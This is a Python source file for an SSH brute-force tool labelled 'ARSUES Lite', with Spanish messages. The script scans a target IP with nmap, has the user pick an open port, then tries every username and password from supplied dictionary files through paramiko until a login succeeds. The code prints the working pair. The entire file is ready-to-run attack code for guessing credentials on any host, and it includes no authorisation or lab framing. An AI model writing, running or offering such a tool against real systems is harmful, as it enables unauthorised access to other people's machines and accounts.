import sys
import time
import socket
import paramiko
import subprocess
from paramiko.ssh_exception import SSHException, AuthenticationException

W = '\033[37m' # Default
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
x = 0

def ascii_banner():
    banner = r""" """+O+"""
    █████╗ ██████╗ ███████╗██╗   ██╗███████╗███████╗
    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝
    ███████║██████╔╝███████╗██║   ██║█████╗  ███████╗
    ██╔══██║██╔══██║╚════██║██║   ██║██╔══╝  ╚════██║
    ██║  ██║██║  ██║███████║╚██████╔╝███████╗███████║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝ """+O+"""Lite"""+W+"""

                        BRUTE FORCE TOOL
                                    """+P+""" By Mrx04programmer
    """
    print(banner)

def print_text_with_effect(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def display_loading_effect():
    loading = f"{W}=============> {O}ATAQUE INICIALIZADO  {R}--[{W}"
    for i in range(5):
        sys.stdout.write("\r" + loading +O+ "O " * (i + 1))
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n")

def scan_ports(ip):
    print(f"{P}Escaneando puertos abiertos a {W} {ip}...")
    
    try:
        result = subprocess.check_output(['nmap', '-T4', '--open', ip], encoding='utf-8', errors='ignore')
        open_ports = []
        
        for line in result.splitlines():
            if 'open' in line and '/tcp' in line:
                parts = line.split()
                port_info = parts[0]
                port = port_info.split('/')[0]
                open_ports.append(port)
        
        if not open_ports:
            print(f"{R}[ ERR ] {W} No se encontraron puertos abiertos.")
            sys.exit()
        
        print(f"{O}Puertos abiertos en {ip}:")
        for index, port in enumerate(open_ports, start=1):
            print(f"{G}[{index}] {W}Puerto {port}")
        
        return open_ports
    
    except subprocess.CalledProcessError as e:
        print(f"{R}[ ERR ] {W} Error al ejecutar Nmap: {e}")
        sys.exit()
    except Exception as e:
        print(f"{R}[ ERR ] {W} Error inesperado: {e}")
        sys.exit()

def _brute_force(ip, port, user_dict_file, pass_dict_file):
    client = None
    try:
        with open(user_dict_file, 'r', encoding='utf-8', errors='ignore') as uf:
            usernames = uf.readlines()
        with open(pass_dict_file, 'r', encoding='utf-8', errors='ignore') as pf:
            passwords = pf.readlines()
    except FileNotFoundError:
        print_text_with_effect(f"{R}[ERR] {W} Archivo de diccionario no encontrado.")
        sys.exit()

    total_attempts = len(usernames) * len(passwords)
    print(f"{C}Total de combinaciones a probar: {total_attempts}")

    start_time = time.time()
    
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            sys.stdout.write(f"\r{B}[ * ] {W}Probando: {username}:{password}")
            sys.stdout.flush()
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(ip, port=int(port), username=username, password=password, timeout=10)
                
                print(f"\n{G}[ FOUND ] {W} Combinación encontrada: {username}:{password}")
                client.close()
                exit()
            
            except AuthenticationException:
                continue
            
            except (SSHException, socket.error, ConnectionResetError) as e:
                # Captura de forma limpia el error de banner cerrado o reseteado por el peer
                continue
            
            except Exception as e:
                print(f"\n{R}[ - ] {W}Error de conexión inesperado: {e}")
                sys.exit()
            
            finally:
                if client:
                    client.close()
    
    end_time = time.time()
    elapsed_time = end_time - start_time
    avg_time_per_attempt = elapsed_time / total_attempts if total_attempts > 0 else 0
    estimated_total_time = avg_time_per_attempt * total_attempts
    
    print(f"{C}Tiempo total estimado: {estimated_total_time:.2f} segundos")
    print(f"{C}Tiempo promedio por intento: {avg_time_per_attempt:.2f} segundos")

if __name__ == "__main__":
    ascii_banner()
    print(f"{O}=============> {W}Iniciando el ataque de fuerza bruta  {O}<=============")

    if len(sys.argv) != 4:
        print(f"{C}Uso: {W}python3 {sys.argv[0]} <archivo_de_diccionario_usuarios> <archivo_de_diccionario_contraseñas> <IP>")
        sys.exit()

    user_dict_file = sys.argv[1]
    pass_dict_file = sys.argv[2]
    ip = sys.argv[3]

    open_ports = scan_ports(ip)
    
    try:
        choice = int(input(f"{C}Seleccione un número de puerto para realizar el ataque de fuerza bruta: "))
        if 1 <= choice <= len(open_ports):
            port = open_ports[choice - 1]
        else:
            print(f"{R}[ ERR ] {W} Selección de puerto no válida.")
            sys.exit()
    except ValueError:
        print(f"{R}[ ERR ] {W} Entrada no válida.")
        sys.exit()
    
    display_loading_effect()
    _brute_force(ip, port, user_dict_file, pass_dict_file)
    if x != 1:
        print(f"\n\r{R}FINISH {W}No se logró desbloquear la seguridad mediante los diccionarios brindados.")
